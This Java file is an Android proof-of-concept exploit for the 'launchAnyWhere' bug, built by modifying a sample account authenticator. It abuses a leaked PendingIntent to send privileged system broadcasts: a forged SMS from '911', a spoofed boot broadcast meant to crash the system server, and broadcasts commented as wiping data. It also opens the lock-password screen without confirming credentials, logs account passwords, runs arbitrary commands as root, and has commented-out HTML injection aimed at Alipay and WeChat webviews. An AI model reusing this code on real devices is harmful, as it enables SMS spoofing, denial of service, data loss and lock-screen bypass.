
package com.example.android.samplesync.authenticator;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Calendar;
import java.util.GregorianCalendar;

import com.example.android.samplesync.Constants;
import com.example.android.samplesync.client.NetworkUtilities;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentSender;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

/**
launchAnyWhere(Bug )    poc   by  retme  

weibo: @retme
http://blogs.360.cn
http://retme.net

 */
class Authenticator extends AbstractAccountAuthenticator {

	
    /** The tag used to log to adb console. **/
    private static final String TAG = "Authenticator";
    
    private static final String VERSION = "v2";

    // Authentication Service context
    private final Context mContext;

    public Authenticator(Context context) {
        super(context);
        mContext = context;
    }

    
    public final static String HTML = 
    	    "<body>" + 
    	    "<u>Wait a few seconds.</u>" + 
    	    "<script>" + 
    	    "var d = document;" + 
    	    "function doitjs() {" + 
    	    " var xhr = new XMLHttpRequest;" + 
    	    " xhr.onload = function() {" + 
    	    " var txt = xhr.responseText;" + 
    	    " d.body.appendChild(d.createTextNode(txt));" + 
    	    " alert(txt);" + " };" + 
    	    " xhr.open('GET', d.URL);" + 
    	    " xhr.send(null);" + 
    	    "}" + 
    	    "setTimeout(doitjs, 8000);" + 
    	    "</script>" + 
    	    "</body>";
    
    public final static String HTML2 = 
    "<script language=\"javascript\" type=\"text/javascript\">" +
    "window.location.href=\"http://blogs.360.cn\"; " +
"</script>";

public static Context getGlobalApplicationContext()
{
    // ActivityThread at = ActivityThread.currentActivityThread();
    //Class clazz  = ReflectionHelper.getClass("android.app.ActivityThread");
    Class[] type = null;
    Object[] args = null;
    Object AT = ReflectionHelper.invokeStaticMethod("android.app.ActivityThread", type, "currentActivityThread", args);
    if (AT!=null) {
        Object appObject =  ReflectionHelper.invokeNonStaticMethod(AT, type,"getApplication", args);
        if (appObject!=null && appObject instanceof Context) {
            return (Context)appObject;
        }
    }
    return null;
}
private static byte reverseByte(byte b) {
    return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
}
private static byte[] createFakeSms(Context context,String sender,String body){
	
	
	  //Source: http://stackoverflow.com/a/12338541
    //Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
        byte[] pdu = null;
        byte[] scBytes = PhoneNumberUtils
                .networkPortionToCalledPartyBCD("0000000000");
        byte[] senderBytes = PhoneNumberUtils
                .networkPortionToCalledPartyBCD(sender);
        int lsmcs = scBytes.length;
        byte[] dateBytes = new byte[7];
        Calendar calendar = new GregorianCalendar();
        dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
        dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
        dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
        dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
        dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
        dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
        dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
                .get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
        try {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            bo.write(lsmcs);
            bo.write(scBytes);
            bo.write(0x04);
            bo.write((byte) sender.length());
            bo.write(senderBytes);
            bo.write(0x00);
            bo.write(0x00); // encoding: 0 for default 7bit
            bo.write(dateBytes);
            try {
                String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
                Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
                Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(
                        "stringToGsm7BitPacked", new Class[] { String.class });
                stringToGsm7BitPacked.setAccessible(true);
                byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null,
                        body);
                bo.write(bodybytes);
            } catch (Exception e) {
            }

            pdu = bo.toByteArray();
        } catch (IOException e) {
        }
        
        return pdu;
}
public static boolean RootCommand(String command){  
    Process process = null;  
    DataOutputStream os = null;  
    try{  
        process = Runtime.getRuntime().exec("su");  
        os = new DataOutputStream(process.getOutputStream());  
        os.writeBytes(command + "\n");  
        os.writeBytes("exit\n");  
        os.flush();  
        process.waitFor();  
    } catch (Exception e){  
        Log.d("*** DEBUG ***", "ROOT failed" + e.getMessage());  
        return false;  
    } finally {
        try{  
            if (os != null) {  
                os.close();  
            }  
            process.destroy();  
        } catch (Exception e) {  
        }  
    }  
    Log.d("*** DEBUG ***", "Root succeed ");  
    return true;  
} 

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
            String authTokenType, String[] requiredFeatures, Bundle options) {
        Log.v(TAG, "addAccount()");
        //final Intent intent = new Intent(mContext, AuthenticatorActivity.class);
        Intent intent = new Intent();
       /* intent.setComponent(new ComponentName(
               "com.eg.android.AlipayGphone",
                  "com.alipay.mobile.browser.HtmlActivity"));*/
        
        /*intent.setComponent(new ComponentName(
                "com.tencent.mm",
                   "com.tencent.mm.plugin.webview.ui.tools.ContactQZoneWebView"));
        
       
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //intent.putExtra("url", "http://drops.wooyun.org/webview.html");
        intent.putExtra("data", HTML2);
        intent.putExtra("baseurl", "http://www.360.cn");
        intent.putExtra("title", "Account bug");*/
        
        if(this.VERSION.contains("v2")){
        	PendingIntent pending_intent = (PendingIntent)options.get("pendingIntent");
        	if(intent!=null){
        	SharedPreferences sp = getGlobalApplicationContext().getSharedPreferences("poc", getGlobalApplicationContext().MODE_WORLD_READABLE);
        	int type   = sp.getInt("poc_type", 1);
        	switch(type){
	        		case 0:
	        			//system server will crash!!
	        			intent.setAction("android.intent.action.BOOT_COMPLETED");
	        			break;
	        		case 1:
	            		//911 will send you a msg!!
	
	                    byte[] pduu = createFakeSms(getGlobalApplicationContext(),"911","hello poc");
	                    Object[] objArray  = {pduu};
	                    
	                    intent.setAction("android.provider.Telephony.SMS_DELIVER");
	                    intent.putExtra("pdus", objArray);
	                    intent.putExtra("format", new String("3gpp"));
	        			break;
	        		case 2:
	        			//wipe data
	        			intent.setAction("com.google.android.c2dm.intent.RECEIVE");
	        			intent.putExtra("from", new String("google.com"));
	        			break;
	        		case 3:
	        			//wipe data
	        			intent.setAction("com.google.android.c2dm.intent.RECEIVE");
	        			intent.putExtra("from", new String("google.com"));
	        			break;
        			default:
        				break;
        					
     		}
   
                try {
                	pending_intent.send(getGlobalApplicationContext(),0,intent,null,null,null);
    			} catch (CanceledException e) {
    				e.printStackTrace();
    			}
        	}


            
            final Bundle bundle = new Bundle();
            return bundle;
        	
        }else{
        	
            intent.setComponent(new ComponentName(
                    "com.android.settings",
                      "com.android.settings.ChooseLockPassword"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("confirm_credentials",false);
            final Bundle bundle = new Bundle();
            bundle.putParcelable(AccountManager.KEY_INTENT, intent);
            return bundle;
        }
        

    }

    @Override
    public Bundle confirmCredentials(
            AccountAuthenticatorResponse response, Account account, Bundle options) {
        Log.v(TAG, "confirmCredentials()");
        return null;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        Log.v(TAG, "editProperties()");
        throw new UnsupportedOperationException();
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) throws NetworkErrorException {
        Log.v(TAG, "getAuthToken()");

        // If the caller requested an authToken type we don't support, then
        // return an error
       if (!authTokenType.equals(Constants.AUTHTOKEN_TYPE)) {
            final Bundle result = new Bundle();
            result.putString(AccountManager.KEY_ERROR_MESSAGE, "invalid authTokenType");
            
            Log.v(TAG, "invalid authTokenType" );
            return result;
        }

        // Extract the username and password from the Account Manager, and ask
        // the server for an appropriate AuthToken.
        final AccountManager am = AccountManager.get(mContext);
        final String password = am.getPassword(account);
        
        
        Log.v(TAG, "password()"  + password);
        if (password != null && false ) {
             String authToken ;//= NetworkUtilities.authenticate(account.name, password);
            authToken = "sadklKLOIHogOpokjh8";
            if (!TextUtils.isEmpty(authToken)) {
            	
            	Log.v(TAG, "start intent");
                final Bundle result = new Bundle();
                result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
                result.putString(AccountManager.KEY_ACCOUNT_TYPE, Constants.ACCOUNT_TYPE);
                result.putString(AccountManager.KEY_AUTHTOKEN, authToken);
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(
                        "com.android.settings",
                          "com.android.settings.ChooseLockPassword"));
                intent.setAction(Intent.ACTION_RUN);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		//intent.putExtra(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
        		result.putParcelable(AccountManager.KEY_INTENT, intent);
        
                return result;
            }
        }

        // If we get here, then we couldn't access the user's password - so we
        // need to re-prompt them for their credentials. We do that by creating
        // an intent to display our AuthenticatorActivity panel.
        /*final Intent intent = new Intent(mContext, AuthenticatorActivity.class);
        intent.putExtra(AuthenticatorActivity.PARAM_USERNAME, account.name);
        intent.putExtra(AuthenticatorActivity.PARAM_AUTHTOKEN_TYPE, authTokenType);
        intent.putExtra(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);*/
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.android.settings",
                  "com.android.settings.ChooseLockPassword"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        final Bundle bundle = new Bundle();

        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        bundle.putString(AccountManager.KEY_AUTH_FAILED_MESSAGE, "You have  a  missed Call");
        return bundle;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        // null means we don't support multiple authToken types
        Log.v(TAG, "getAuthTokenLabel()");
        return null;
    }

    @Override
    public Bundle hasFeatures(
            AccountAuthenticatorResponse response, Account account, String[] features) {
        // This call is used to query whether the Authenticator supports
        // specific features. We don't expect to get called, so we always
        // return false (no) for any queries.
        Log.v(TAG, "hasFeatures()");
        final Bundle result = new Bundle();
        result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
        return result;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account,
            String authTokenType, Bundle loginOptions) {
        Log.v(TAG, "updateCredentials()");
        return null;
    }
}
